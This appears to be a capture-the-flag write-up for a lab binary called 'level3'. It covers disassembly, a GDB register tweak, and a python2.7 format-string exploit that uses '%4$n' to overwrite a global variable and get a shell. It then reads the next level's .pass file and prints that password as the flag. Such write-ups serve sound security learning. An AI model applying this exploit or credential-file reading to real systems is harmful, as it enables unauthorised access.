# level3

## disassemble

```shell
objdump -dC -M intel level3
```

# With GDB

```shell
gdb level3 
(gdb) disassemble v
    0x080484d5 <+49>:    call   0x8048390 <printf@plt>
    0x080484da <+54>:    mov    0x804988c,%eax
    0x080484df <+59>:    cmp    $0x40,%eax
(gdb) break *0x080484df
(gdb) run
(gdb) set $eax=64
(gdb) step
Single stepping until exit from function v,
which has no line number information.
Wait what?!
$ whoami
level3
```

## exploit

```shell
python2.7 -c 'print("BBBB" + " %4p")'  | ./level3 
```

```shell
# 80484d5:       e8 b6 fe ff ff          call   8048390 <printf@plt>
# 80484da:       a1 8c 98 04 08          mov    eax,ds:0x804988c
# 80484df:       83 f8 40                cmp    eax,0x40

python2.7 -c 'print("\x8c\x98\x04\x08" + "a"*60 + "%4$n")' > /tmp/exploit.txt
cat /tmp/exploit.txt - | ./level3
```

## flag

```shell
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
